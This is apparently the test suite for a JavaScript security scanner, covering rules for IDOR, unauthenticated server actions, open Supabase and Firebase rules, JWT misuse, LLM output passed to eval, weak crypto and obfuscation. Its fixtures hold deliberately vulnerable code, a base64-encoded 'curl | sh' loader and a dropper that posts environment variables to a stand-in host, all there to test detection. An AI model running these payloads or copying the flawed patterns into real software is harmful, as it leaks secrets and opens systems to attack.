'use strict';

// Tests for the 2026 pack (rules + obfuscation + entrypoints/attack surface) and
// the JSX AST fix. Zero dependencies: assert + fs + os + path.

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { scan } = require('../src/scanner');
const { extractEntrypoints } = require('../src/routes');
const { buildSurface } = require('../src/surface');
const { analyzeObfuscation, decodeLayers } = require('../src/obfuscation');

function tmpProject(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vg-2026-'));
  for (const [name, content] of Object.entries(files)) {
    const full = path.join(dir, name);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
  return dir;
}

function ids(result) {
  return result.findings.map((f) => f.ruleId);
}

function asFiles(files) {
  return Object.entries(files).map(([rel, content]) => ({
    rel,
    content,
    lines: content.split(/\r?\n/),
  }));
}

const tests = [];

// --- JSX / AST coverage -----------------------------------------------------

tests.push({
  name: 'JSX files parse and walk without degrading the AST pass',
  fn() {
    const dir = tmpProject({
      'app/page.tsx': `export default function Page() {\n  return <div className="x"><span>{1 + 1}</span></div>;\n}\n`,
      'src/Widget.jsx': `export function Widget({ label }) {\n  return <button {...{ onClick: () => {} }}>{label}</button>;\n}\n`,
    });
    const r = scan(dir);
    assert.strictEqual(r.diagnostics.parseFailedFiles.length, 0, 'no parse failures');
    assert.strictEqual(r.diagnostics.degradedFileCount, 0, 'no degraded files');
    assert.strictEqual(r.engine.astAvailable, true, 'ast engine available');
  },
});

// --- rules-2026 -------------------------------------------------------------

tests.push({
  name: '2026: IDOR fetch by request id without owner filter fires; owner-scoped query is clean',
  fn() {
    const dir = tmpProject({
      'app/api/posts/[id]/route.ts': `export async function GET(req, { params }) {\n  const post = await prisma.post.findUnique({ where: { id: params.id } });\n  return Response.json(post);\n}\n`,
      'app/api/safe/[id]/route.ts': `export async function GET(req, { params }) {\n  const s = await auth();\n  const post = await prisma.post.findFirst({ where: { id: params.id, authorId: s.user.id } });\n  return Response.json(post);\n}\n`,
    });
    const r = scan(dir);
    assert(ids(r).includes('authz2026.orm-fetch-by-param-id-no-owner'), 'IDOR rule fired');
    const safe = r.findings.filter((f) => f.file.includes('safe/[id]') && f.ruleId === 'authz2026.orm-fetch-by-param-id-no-owner');
    assert.strictEqual(safe.length, 0, 'owner-scoped query is not flagged');
  },
});

tests.push({
  name: '2026: Server Action without auth is critical; with auth is clean',
  fn() {
    const dir = tmpProject({
      'app/actions.ts': `'use server';\nexport async function deletePost(id: string) {\n  await prisma.post.delete({ where: { id } });\n}\n`,
      'app/safe-actions.ts': `'use server';\nimport { auth } from '@/auth';\nexport async function deletePost(id: string) {\n  const s = await auth();\n  if (!s) throw new Error('401');\n  await prisma.post.delete({ where: { id, authorId: s.user.id } });\n}\n`,
    });
    const r = scan(dir);
    assert(ids(r).includes('nextjs2026.server-action-no-auth'), 'server action rule fired');
    const safe = r.findings.filter((f) => f.file.includes('safe-actions') && f.ruleId === 'nextjs2026.server-action-no-auth');
    assert.strictEqual(safe.length, 0, 'guarded action is clean');
  },
});

tests.push({
  name: '2026: middleware matcher excluding /api is flagged, ordinary matcher is not',
  fn() {
    const dir = tmpProject({
      'middleware.ts': `export function middleware() {}\nexport const config = { matcher: ['/((?!api|_next/static|favicon.ico).*)'] };\n`,
      'middleware-safe.ts': `export function middleware() {}\nexport const config = { matcher: ['/dashboard/:path*', '/api/admin/:path*'] };\n`,
    });
    const r = scan(dir);
    const hits = r.findings.filter((f) => f.ruleId === 'nextjs2026.middleware-matcher-excludes-api');
    assert.strictEqual(hits.length, 1, 'only the excluding matcher fires');
    assert(hits[0].file.endsWith('middleware.ts') && !hits[0].file.endsWith('middleware-safe.ts'));
  },
});

tests.push({
  name: '2026: RLS USING (true), SECURITY DEFINER without search_path and GRANT ALL fire',
  fn() {
    const dir = tmpProject({
      'supabase/migrations/001.sql': [
        'create table todos (id uuid primary key, user_id uuid);',
        'alter table todos enable row level security;',
        'create policy "all" on todos for all using (true);',
        'create function f() returns void security definer language plpgsql as $$ begin end $$;',
        'grant all on todos to anon;',
        'create function safe_f() returns void security definer set search_path = \'\' language plpgsql as $$ begin end $$;',
      ].join('\n'),
    });
    const r = scan(dir);
    const got = ids(r);
    assert(got.includes('supabase2026.rls-policy-using-true'));
    assert(got.includes('supabase2026.security-definer-no-search-path'));
    assert(got.includes('supabase2026.grant-all-to-anon'));
    // The function that pins search_path on the same statement is not counted.
    const definer = r.findings.filter((f) => f.ruleId === 'supabase2026.security-definer-no-search-path');
    assert.strictEqual(definer.length, 1);
  },
});

tests.push({
  name: '2026: Firebase rules files are scanned at all (previously .rules was not a scanned extension)',
  fn() {
    const dir = tmpProject({
      'firestore.rules': 'service cloud.firestore {\n  match /databases/{db}/documents {\n    match /todos/{id} { allow read, write: if true; }\n    match /notes/{id} { allow write: if request.auth != null; }\n  }\n}\n',
    });
    const r = scan(dir);
    const got = ids(r);
    assert(got.includes('firebase2026.rules-allow-true'), 'open rules flagged');
    assert(got.includes('firebase2026.rules-auth-only-write'), 'auth-only write flagged');
  },
});

tests.push({
  name: '2026: JWT decode-not-verify and no-expiry/sign fire',
  fn() {
    const dir = tmpProject({
      'lib/auth.js': [
        "const jwt = require('jsonwebtoken');",
        "const secret = process.env.JWT_SECRET || 'dev-secret';",
        'function who(token) { return jwt.decode(token).userId; }',
        'const t = jwt.sign({ userId: 1 }, secret);',
      ].join('\n'),
    });
    const r = scan(dir);
    const got = ids(r);
    assert(got.includes('jwt2026.decode-used-for-identity'));
    assert(got.includes('jwt2026.weak-fallback-secret'));
    assert(got.includes('jwt2026.no-expiry'));
  },
});

tests.push({
  name: '2026: LLM output to eval/SQL and system prompt from request fire',
  fn() {
    const dir = tmpProject({
      'lib/ai.js': [
        "const completion = await client.chat.completions.create({ messages: [{ role: 'system', content: 'x' + req.body.prompt }] });",
        'eval(completion.choices[0].message.content);',
        'await db.query(`select * from t where id = ${completion.choices[0].message.content}`);',
      ].join('\n'),
    });
    const r = scan(dir);
    const got = ids(r);
    assert(got.includes('llm2026.output-to-exec'));
    assert(got.includes('llm2026.output-to-sql'));
    assert(got.includes('llm2026.system-prompt-from-request'));
  },
});

tests.push({
  name: '2026: crypto, log injection and new secret formats fire',
  fn() {
    const dir = tmpProject({
      'lib/crypto.js': [
        "const crypto = require('crypto');",
        "const h = crypto.createHash('md5').update(password).digest('hex');",
        'const otp = Math.floor(Math.random() * 100000);',
        "const c = crypto.createCipheriv('aes-256-ecb', key, Buffer.alloc(16));",
      ].join('\n'),
      'lib/log.js': [
        "console.log('login ' + req.body.email);",
        "logger.info('token ' + req.headers.authorization);",
      ].join('\n'),
      'lib/keys.js': "const a = 'sk-or-v1-abcdefghijklmnopqrstuvwxyz0123456789';\n",
    });
    const r = scan(dir);
    const got = ids(r);
    assert(got.includes('crypto2026.weak-hash-for-password'));
    assert(got.includes('crypto2026.math-random-token'));
    assert(got.includes('crypto2026.ecb-mode'));
    assert(got.includes('leak2026.log-injection-request-interpolation'));
    assert(got.includes('leak2026.logs-auth-header'));
    assert(got.includes('secret2026.openrouter-key'));
  },
});

tests.push({
  name: '2026: benign code does not fire the new pack (no false alarms on safe patterns)',
  fn() {
    const dir = tmpProject({
      'lib/safe.js': [
        "const crypto = require('crypto');",
        'const token = crypto.randomBytes(32).toString("hex");',
        'const hash = crypto.createHash("sha256").update(data).digest("hex");',
        'const safe = DOMPurify.sanitize(html);',
        "res.json({ token, hash, safe });",
        'export function GET() { return Response.json({ ok: true }); }',
      ].join('\n'),
      'components/Card.tsx': 'export function Card({ t }) { return <div>{t}</div>; }\n',
    });
    const r = scan(dir);
    const bad = r.findings.filter((f) => String(f.ruleId).startsWith('crypto2026.') || String(f.ruleId).startsWith('leak2026.'));
    assert.strictEqual(bad.length, 0, 'no crypto/log findings on safe code: ' + JSON.stringify(bad.map((f) => f.ruleId)));
  },
});

// --- obfuscation ------------------------------------------------------------

tests.push({
  name: 'obf: base64 payload decoding and executable-position detection',
  fn() {
    const payload = Buffer.from("require('child_process').exec('curl http://x/y | sh')").toString('base64');
    const decoded = decodeLayers(payload);
    assert.strictEqual(decoded.decoded, "require('child_process').exec('curl http://x/y | sh')");
    const content = `const p = Buffer.from('${payload}', 'base64').toString('utf8');\neval(p);\n`;
    const findings = analyzeObfuscation(content, 'src/loader.js');
    assert(findings.some((f) => f.ruleId.startsWith('obf.')), 'encoded payload flagged');
  },
});

tests.push({
  name: 'obf: dropper behaviour needs all three capabilities; ordinary code stays quiet',
  fn() {
    const dropper = "const cp=require('child_process');const e=process.env;fetch('https://x.example/a',{method:'POST',body:JSON.stringify(e)});cp.exec('id');";
    assert(analyzeObfuscation(dropper, 'src/evil.js').some((f) => f.ruleId === 'obf.dropper-behavior'));
    const clean = "const fs=require('fs');function read(p){return fs.readFileSync(p)}\nmodule.exports=read;\n";
    assert.strictEqual(analyzeObfuscation(clean, 'src/reader.js').length, 0);
  },
});

tests.push({
  name: 'obf: minified vendor bundles are skipped, obfuscated first-party code is flagged',
  fn() {
    const obf = 'var _0x1a2b=["\\x61\\x62","\\x63\\x64"];function _0x9f(){return _0x1a2b}while(!![]){break}console.log(_0x9f())';
    assert.strictEqual(analyzeObfuscation(obf, 'vendor/lib.min.js').length, 0, '.min.js skipped');
    assert.strictEqual(analyzeObfuscation(obf, 'dist/app.js').length, 0, 'dist skipped');
  },
});

// --- entrypoints + surface --------------------------------------------------

tests.push({
  name: 'routes: Next app router, Express mount inheritance, tRPC public mutation',
  fn() {
    const files = asFiles({
      'app/api/users/[id]/route.ts': `export async function GET(req, { params }) {\n  return Response.json(await db.user.findUnique({ where: { id: params.id } }));\n}\n`,
      'src/routes/users.js': `const router = require('express').Router();\nrouter.use(requireAuth);\nrouter.delete('/:id', (req, res) => { res.json({}); });\nmodule.exports = router;\n`,
      'src/app.js': `const app = require('express')();\napp.use('/api/users', require('./routes/users'));\n`,
      'src/trpc/router.ts': `import { publicProcedure, protectedProcedure, router } from './trpc';\nexport const appRouter = router({\n  deleteUser: publicProcedure.input(z.string()).mutation(async ({ input }) => deleteUser(input)),\n  listUsers: protectedProcedure.query(async () => users),\n});\n`,
    });
    const { entrypoints } = extractEntrypoints(files);
    const byPath = (p) => entrypoints.find((e) => e.path === p);
    assert(byPath('/api/users/:id'), 'next route found');
    const del = entrypoints.find((e) => e.method === 'DELETE' && e.path === '/api/users/:id');
    assert(del, 'express route mounted with prefix');
    assert.strictEqual(del.auth, 'enforced', 'auth inherited from router.use');
    const pub = entrypoints.find((e) => e.kind === 'trpc' && e.path === 'deleteUser');
    assert(pub, 'trpc mutation found');
    assert.strictEqual(pub.auth, 'none', 'publicProcedure mutation is unguarded');
  },
});

tests.push({
  name: 'surface: reachability separates dead code from an exploitable endpoint',
  fn() {
    const files = asFiles({
      'app/api/notes/[id]/route.ts': `import { db } from '../../../lib/db';\nexport async function GET(req, { params }) {\n  const n = await db.note.findUnique({ where: { id: params.id } });\n  return Response.json(n);\n}\n`,
      'lib/db.ts': `export const db = { note: { findUnique: (q) => q } };\n`,
      'lib/dead.ts': `export function unused(x) { return eval(x); }\n`,
    });
    const dir = tmpProject(Object.fromEntries(files.map((f) => [f.rel, f.content])));
    const r = scan(dir, { surface: true });
    const s = r.surface;
    assert(s, 'surface produced');
    assert(s.entrypoints.length >= 1, 'entrypoint found');
    const ep = s.entrypoints.find((e) => e.path === '/api/notes/:id');
    assert(ep, 'route present');
    assert.strictEqual(ep.ownership, 'missing', 'IDOR signal present');
    assert(ep.risks.some((x) => x.ruleId === 'authz2026.orm-fetch-by-param-id-no-owner' && x.reach === 'direct'));
    const dead = r.findings.find((f) => f.file === 'lib/dead.ts');
    assert(dead && dead.surface && dead.surface.reach === 'dead', 'unreachable file marked dead');
  },
});

tests.push({
  name: 'surface: Express handler reference resolves cross-file and exposes an IDOR',
  fn() {
    const files = asFiles({
      'app/routes/index.js': [
        "const Allocations = require('./allocations');",
        'module.exports = (app, db) => {',
        '  const allocations = new Allocations(db);',
        '  const isLoggedIn = (req, res, next) => next();',
        "  app.get('/allocations/:userId', isLoggedIn, allocations.displayAllocations);",
        '};',
      ].join('\n'),
      'app/routes/allocations.js': [
        'function Allocations(db) {',
        '  this.displayAllocations = (req, res, next) => {',
        '    const { userId } = req.params;',
        '    db.getByUserIdAndThreshold(userId, 0, (err, rows) => res.json(rows));',
        '  };',
        '}',
        'module.exports = Allocations;',
      ].join('\n'),
    });
    const dir = tmpProject(Object.fromEntries(files.map((f) => [f.rel, f.content])));
    const r = scan(dir, { surface: true, minConfidence: 'medium' });
    const ep = r.surface.entrypoints.find((e) => e.path === '/allocations/:userId');
    assert(ep, 'route found');
    assert.strictEqual(ep.auth, 'enforced', 'middleware argument counts as a guard');
    assert.strictEqual(ep.ownership, 'missing', 'IDOR signal from the resolved handler body');
    assert.strictEqual(ep.verdict, 'critical', 'IDOR route is critical without any rule firing');
    assert(ep.bodyFile === 'app/routes/allocations.js', 'handler body resolved to the other file');
    assert(r.surface.exposed.some((x) => x.path === '/allocations/:userId'), 'listed as exposed');
  },
});

// The repo's runner treats each exported test as a FUNCTION carrying a `name`
// property (see test/entropy-tests.js). Adapt our {name, fn} table to that shape.
const exported = tests.map((t) => {
  const f = t.fn;
  Object.defineProperty(f, 'name', { value: t.name, configurable: true });
  return f;
});

module.exports = { tests: exported };
